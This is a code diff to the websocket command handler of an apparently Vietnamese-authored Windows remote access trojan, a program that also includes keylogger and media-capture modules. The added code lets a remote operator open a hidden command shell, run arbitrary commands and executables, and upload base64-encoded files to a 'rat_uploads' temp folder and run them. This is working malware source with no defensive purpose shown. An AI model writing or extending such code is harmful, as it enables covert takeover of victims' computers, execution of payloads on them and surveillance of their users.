@@ -15,6 +15,7 @@
 #include "SystemManager.h"
 #include "Keylogger.h"
 #include "MediaManager.h"
+#include "CmdTerminal.h"
 
 // Tắt cảnh báo biên dịch không cần thiết
 #pragma warning(push)
@@ -200,6 +201,100 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
                     j_res["msg"] = "Dang ghi hinh 10s...";
                 }
                 j_res["type"] = "ACTION_RESULT";
+            }
+
+            // =============================================================
+            // 5. NHÓM LỆNH: CMD TERMINAL
+            // =============================================================
+            else if (cmd == "CMD_START") {
+                bool showWindow = j_req.contains("showWindow") ? j_req["showWindow"].get<bool>() : false;
+                bool success = StartCmdSession(showWindow);
+                
+                if (success) {
+                    j_res["msg"] = "CMD session started";
+                    j_res["running"] = true;
+                }
+                else {
+                    j_res["msg"] = "Failed to start CMD or session already running";
+                    j_res["running"] = false;
+                }
+                j_res["type"] = "CMD_STATUS";
+            }
+            else if (cmd == "CMD_EXEC") {
+                std::string command = j_req["command"];
+                SendCmdCommand(command);
+                j_res["msg"] = "Command sent";
+                j_res["type"] = "ACTION_RESULT";
+            }
+            else if (cmd == "CMD_STOP") {
+                StopCmdSession();
+                j_res["msg"] = "CMD session stopped";
+                j_res["running"] = false;
+                j_res["type"] = "CMD_STATUS";
+            }
+            else if (cmd == "CMD_KILL") {
+                TerminateCmdProcess();
+                j_res["msg"] = "CMD process terminated forcefully";
+                j_res["running"] = false;
+                j_res["type"] = "CMD_STATUS";
+            }
+            else if (cmd == "CMD_RUN_FILE") {
+                std::string filePath = j_req["filePath"];
+                bool showWindow = j_req.contains("showWindow") ? j_req["showWindow"].get<bool>() : false;
+                bool success = RunExecutableFile(filePath, showWindow);
+                
+                if (success) {
+                    j_res["msg"] = "File execution started: " + filePath;
+                    j_res["running"] = true;
+                }
+                else {
+                    j_res["msg"] = "Failed to execute file: " + filePath;
+                    j_res["running"] = false;
+                }
+                j_res["type"] = "CMD_STATUS";
+            }
+            else if (cmd == "CMD_STATUS") {
+                j_res["running"] = g_CmdRunning;
+                j_res["showWindow"] = g_CmdShowWindow;
+                j_res["type"] = "CMD_STATUS";
+            }
+            else if (cmd == "CMD_UPLOAD_RUN") {
+                std::string filename = j_req["filename"];
+                std::string fileData = j_req["fileData"];
+                bool showWindow = j_req.contains("showWindow") ? j_req["showWindow"].get<bool>() : false;
+                
+                // Decode base64
+                std::string decoded = Base64Decode(fileData);
+                
+                // Save to temp directory
+                char tempPath[MAX_PATH];
+                GetTempPathA(MAX_PATH, tempPath);
+                std::string filePath = std::string(tempPath) + "rat_uploads\\";
+                CreateDirectoryA(filePath.c_str(), NULL);
+                filePath += filename;
+                
+                // Write file
+                std::ofstream outFile(filePath, std::ios::binary);
+                if (outFile.is_open()) {
+                    outFile.write(decoded.c_str(), decoded.size());
+                    outFile.close();
+                    
+                    // Run the file
+                    bool success = RunExecutableFile(filePath, showWindow);
+                    if (success) {
+                        j_res["msg"] = "File uploaded and executed: " + filename;
+                        j_res["running"] = true;
+                    }
+                    else {
+                        j_res["msg"] = "File uploaded but failed to execute: " + filename;
+                        j_res["running"] = false;
+                    }
+                }
+                else {
+                    j_res["msg"] = "Failed to save file: " + filename;
+                    j_res["running"] = false;
+                }
+                j_res["type"] = "CMD_STATUS";
             }
 
             // =============================================================
